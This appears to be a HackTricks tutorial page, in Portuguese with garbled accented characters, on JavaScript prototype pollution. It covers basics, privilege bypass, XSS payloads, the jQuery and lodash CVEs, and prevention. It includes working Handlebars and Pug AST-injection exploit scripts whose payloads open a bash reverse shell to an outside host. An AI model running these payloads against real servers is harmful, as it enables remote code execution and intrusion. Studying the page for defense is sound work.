# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Objetos em JavaScript <a href="#053a" id="053a"></a>

Objetos em JavaScript s√£o essencialmente cole√ß√µes de pares chave-valor, conhecidos como propriedades. Um objeto pode ser criado usando `Object.create` com `null` como argumento para produzir um objeto vazio. Este m√©todo permite a cria√ß√£o de um objeto sem quaisquer propriedades herdadas.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Um objeto vazio √© semelhante a um dicion√°rio vazio, representado como `{}`.

### Fun√ß√µes e Classes em JavaScript

Em JavaScript, classes e fun√ß√µes est√£o intimamente ligadas, com fun√ß√µes frequentemente servindo como construtores para classes. Apesar da falta de suporte nativo a classes em JavaScript, os construtores podem emular o comportamento de classes.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prot√≥tipos em JavaScript

O JavaScript permite a modifica√ß√£o, adi√ß√£o ou exclus√£o de atributos de prot√≥tipo em tempo de execu√ß√£o. Essa flexibilidade possibilita a extens√£o din√¢mica das funcionalidades de uma classe.

Fun√ß√µes como `toString` e `valueOf` podem ser alteradas para mudar seu comportamento, demonstrando a natureza adapt√°vel do sistema de prot√≥tipos do JavaScript.

## Heran√ßa

Na programa√ß√£o baseada em prot√≥tipos, propriedades/m√©todos s√£o herdados por objetos de classes. Essas classes s√£o criadas adicionando propriedades/m√©todos a uma inst√¢ncia de outra classe ou a um objeto vazio.

Deve-se observar que quando uma propriedade √© adicionada a um objeto que serve como prot√≥tipo para outros objetos (como `myPersonObj`), os objetos herdeiros ganham acesso a essa nova propriedade. No entanto, essa propriedade n√£o √© exibida automaticamente a menos que seja explicitamente invocada.

## Polui√ß√£o de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

## Explorando a Polui√ß√£o de Prot√≥tipos em JavaScript

Os objetos JavaScript s√£o definidos por pares de chave-valor e herdam do prot√≥tipo Object do JavaScript. Isso significa que alterar o prot√≥tipo Object pode influenciar todos os objetos no ambiente.

Vamos usar um exemplo diferente para ilustrar:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
O acesso ao prot√≥tipo do Objeto √© poss√≠vel atrav√©s de:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Ao adicionar propriedades ao prot√≥tipo do Object, todo objeto JavaScript herdar√° essas novas propriedades:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## polui√ß√£o de prot√≥tipo

Para um cen√°rio em que o uso de `__proto__` √© restrito, modificar o prot√≥tipo de uma fun√ß√£o √© uma alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Isso afeta apenas objetos criados a partir do construtor `Vehicle`, dando a eles as propriedades `beep`, `hasWheels`, `honk` e `isElectric`.

Dois m√©todos para afetar globalmente objetos JavaScript por meio da polui√ß√£o de prot√≥tipos incluem:

1. Poluindo o `Object.prototype` diretamente:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Poluindo o prot√≥tipo de um construtor para uma estrutura comumente utilizada:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Depois dessas opera√ß√µes, todo objeto JavaScript pode executar os m√©todos `goodbye` e `greet`.

## Poluindo outros objetos

### De uma classe para Object.prototype

Em um cen√°rio onde voc√™ pode **poluir um objeto espec√≠fico** e precisa **chegar ao `Object.prototype`**, voc√™ pode procur√°-lo com algo semelhante ao seguinte c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Polui√ß√£o de elementos de array

Observe que, assim como voc√™ pode poluir atributos de objetos em JS, se voc√™ tiver acesso para poluir um array, voc√™ tamb√©m pode **poluir os valores do array** acess√≠veis **por √≠ndices** (observe que voc√™ n√£o pode sobrescrever valores, ent√£o voc√™ precisa poluir √≠ndices que s√£o de alguma forma usados mas n√£o escritos).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Polui√ß√£o de elementos Html

Ao gerar um elemento HTML via JS, √© poss√≠vel **sobrescrever** o atributo **`innerHTML`** para fazer com que ele escreva **c√≥digo HTML arbitr√°rio**. [Idea and example from this writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemplos

### Exemplo B√°sico

Uma polui√ß√£o de prot√≥tipo ocorre devido a uma falha na aplica√ß√£o que permite a sobrescrita de propriedades em `Object.prototype`. Isso significa que, como a maioria dos objetos deriva suas propriedades de `Object.prototype`

O exemplo mais simples √© adicionar um valor a um **atributo indefinido de um objeto** que ser√° verificado, como:
```javascript
if (user.admin) {
```
Se o atributo **`admin` estiver indefinido**, √© poss√≠vel abusar de uma PP e defini-lo como True com algo como:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
O mecanismo por tr√°s disso envolve a manipula√ß√£o de propriedades de forma que, se um atacante tiver controle sobre determinadas entradas, ele pode modificar o prot√≥tipo de todos os objetos na aplica√ß√£o. Essa manipula√ß√£o geralmente envolve a defini√ß√£o da propriedade `__proto__`, que, em JavaScript, √© sin√¥nimo de modificar diretamente o prot√≥tipo de um objeto.

As condi√ß√µes sob as quais esse ataque pode ser executado com sucesso, conforme descrito em um [estudo](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) espec√≠fico, incluem:

- Realizar uma mesclagem recursiva.
- Definir propriedades com base em um caminho.
- Clonar objetos.


### Fun√ß√£o de Substitui√ß√£o
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Polui√ß√£o de Prot√≥tipo para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Polui√ß√£o de Prot√≥tipo do Lado do Cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do jQuery $ .extend

[Para mais detalhes, confira este artigo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
No jQuery, a fun√ß√£o `$ .extend` pode levar √† polui√ß√£o de prot√≥tipo se o recurso de c√≥pia profunda for utilizado de forma inadequada. Esta fun√ß√£o √© comumente usada para clonar objetos ou mesclar propriedades de um objeto padr√£o. No entanto, quando mal configurada, as propriedades destinadas a um novo objeto podem ser atribu√≠das ao prot√≥tipo em vez disso. Por exemplo:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Essa vulnerabilidade, identificada como CVE-2019‚Äì11358, ilustra como uma c√≥pia profunda pode modificar inadvertidamente o prot√≥tipo, levando a potenciais riscos de seguran√ßa, como acesso administrativo n√£o autorizado se propriedades como `isAdmin` forem verificadas sem a devida verifica√ß√£o de exist√™ncia.


### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do lodash

[Para mais detalhes, confira este artigo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

O [Lodash](https://www.npmjs.com/package/lodash) encontrou vulnerabilidades semelhantes de polui√ß√£o de prot√≥tipo (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Esses problemas foram resolvidos na vers√£o 4.17.11.

### Outro tutorial com CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Polui√ß√£o de Prot√≥tipo AST no NodeJS

O NodeJS utiliza extensivamente √Årvores de Sintaxe Abstrata (AST) em JavaScript para funcionalidades como motores de template e TypeScript. Esta se√ß√£o explora as vulnerabilidades relacionadas √† polui√ß√£o de prot√≥tipo em motores de template, especificamente Handlebars e Pug.

#### An√°lise de Vulnerabilidade do Handlebars

O motor de template Handlebars √© suscet√≠vel a um ataque de polui√ß√£o de prot√≥tipo. Essa vulnerabilidade surge de fun√ß√µes espec√≠ficas dentro do arquivo `javascript-compiler.js`. A fun√ß√£o `appendContent`, por exemplo, concatena `pendingContent` se estiver presente, enquanto a fun√ß√£o `pushSource` redefine `pendingContent` para `undefined` ap√≥s adicionar a origem.

##### Processo de Explora√ß√£o

A explora√ß√£o aproveita a AST (√Årvore de Sintaxe Abstrata) produzida pelo Handlebars, seguindo estes passos:

1. **Manipula√ß√£o do Parser**: Inicialmente, o parser, por meio do n√≥ `NumberLiteral`, garante que os valores sejam num√©ricos. A polui√ß√£o de prot√≥tipo pode contornar isso, permitindo a inser√ß√£o de strings n√£o num√©ricas.
2. **Tratamento pelo Compilador**: O compilador pode processar um Objeto AST ou um template de string. Se `input.type` for igual a `Program`, a entrada √© tratada como pr√©-processada, o que pode ser explorado.
3. **Inje√ß√£o de C√≥digo**: Atrav√©s da manipula√ß√£o de `Object.prototype`, √© poss√≠vel injetar c√≥digo arbitr√°rio na fun√ß√£o do template, o que pode levar √† execu√ß√£o remota de c√≥digo.

Um exemplo que demonstra a explora√ß√£o da vulnerabilidade do Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Este c√≥digo demonstra como um atacante poderia injetar c√≥digo arbitr√°rio em um modelo Handlebars.

**Refer√™ncia Externa**: Um problema relacionado √† polui√ß√£o de prot√≥tipos foi encontrado na biblioteca 'flat', conforme detalhado aqui: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**Refer√™ncia Externa**: [Problema relacionado √† polui√ß√£o de prot√≥tipos na biblioteca 'flat'](https://github.com/hughsk/flat/issues/105)

Exemplo de explora√ß√£o de polui√ß√£o de prot√≥tipos em Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilidade do Pug

O Pug, outra engine de template, enfrenta um risco semelhante de polui√ß√£o de prot√≥tipos. Informa√ß√µes detalhadas est√£o dispon√≠veis na discuss√£o sobre [Inje√ß√£o de AST no Pug](https://blog.p6.is/AST-Injection/#Pug).

Exemplo de polui√ß√£o de prot√≥tipos no Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Medidas Preventivas

Para reduzir o risco de polui√ß√£o de prot√≥tipos, as estrat√©gias listadas abaixo podem ser empregadas:

1. **Imutabilidade de Objetos**: O `Object.prototype` pode ser tornado imut√°vel aplicando `Object.freeze`.
2. **Valida√ß√£o de Entrada**: As entradas JSON devem ser rigorosamente validadas em rela√ß√£o ao esquema da aplica√ß√£o.
3. **Fun√ß√µes de Mesclagem Seguras**: O uso inseguro de fun√ß√µes de mesclagem recursiva deve ser evitado.
4. **Objetos sem Prot√≥tipo**: Objetos sem propriedades de prot√≥tipo podem ser criados usando `Object.create(null)`.
5. **Uso de Mapa**: Em vez de `Object`, deve-se usar `Map` para armazenar pares chave-valor.
6. **Atualiza√ß√µes de Biblioteca**: Patches de seguran√ßa podem ser incorporados atualizando regularmente as bibliotecas.
7. **Ferramentas de An√°lise Est√°tica e Linter**: Use ferramentas como ESLint com plugins apropriados para detectar e prevenir vulnerabilidades de polui√ß√£o de prot√≥tipos.
8. **Revis√µes de C√≥digo**: Implemente revis√µes de c√≥digo minuciosas para identificar e remediar riscos potenciais relacionados √† polui√ß√£o de prot√≥tipos.
9. **Treinamento de Seguran√ßa**: Eduque os desenvolvedores sobre os riscos da polui√ß√£o de prot√≥tipos e as melhores pr√°ticas para escrever c√≥digo seguro.
10. **Uso Cauteloso de Bibliotecas**: Seja cauteloso ao usar bibliotecas de terceiros. Avalie sua postura de seguran√ßa e revise seu c√≥digo, especialmente aqueles que manipulam objetos.
11. **Prote√ß√£o em Tempo de Execu√ß√£o**: Empregue mecanismos de prote√ß√£o em tempo de execu√ß√£o, como usar pacotes npm focados em seguran√ßa que podem detectar e prevenir ataques de polui√ß√£o de prot√≥tipos.

## Refer√™ncias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
